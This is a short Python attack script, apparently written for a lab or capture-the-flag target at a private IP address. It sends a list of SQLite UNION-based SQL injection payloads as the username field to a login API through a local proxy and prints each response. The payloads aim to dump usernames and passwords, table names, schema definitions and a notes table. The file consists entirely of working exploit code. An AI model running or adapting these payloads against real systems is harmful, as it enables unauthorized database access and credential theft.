import requests

# It will create an error [sqli confirm]
# user = "1'"

# Gives the users
# user = "1' OR 1=1 -- +"
 
mqlite_injections = [
 "1' UNION SELECT username ,password FROM users order by id-- -",
 "1' UNION SELECT 1,group_concat(password) FROM users order by id-- -",
 "1' UNION select 1,tbl_name from sqlite_master -- -",
 "1' UNION SELECT NULL, sqlite_version(); -- -",
 "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'; -- -",
 "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='notes'; -- -",
 "' UNION SELECT 1,notes FROM notes-- -"]


url = 'http://10.10.162.144/api/login'

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

for user in mqlite_injections:
	data_obj = {"username": user , "password": "password"}
	r = requests.post(url, data_obj,proxies)
	print(r.text)
	r = requests.post(url, data_obj,proxies)
	print(r.text)
	print("==========================================================\n==========================================================")